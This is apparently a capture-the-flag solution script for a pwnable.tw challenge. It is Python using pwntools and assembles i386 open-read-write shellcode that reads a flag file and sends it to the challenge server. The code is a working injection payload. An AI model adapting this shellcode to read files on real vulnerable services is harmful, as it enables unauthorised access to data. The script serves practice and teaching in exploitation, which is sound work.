#!/usr/bin/env python3
from pwn import *

shellcode = asm(
	'''
	push 0x0
	push 0x67616c66	
	push 0x2f77726f	
	push 0x2f656d6f	
	push 0x682f2f2f 

	
	xor eax, eax 
	mov eax, 0x5
	xor ecx, ecx
	mov ebx, esp
	int 0x80
	
	mov eax, 0x3
	mov ebx, 3
	mov ecx, esp
	mov edx, 0x40
	int 0x80
	
	mov eax, 0x4
	mov ebx, 0x1
	int 0x80
	''', arch = 'i386')

r = remote("chall.pwnable.tw", 10001)
r.sendline(shellcode)
r.interactive()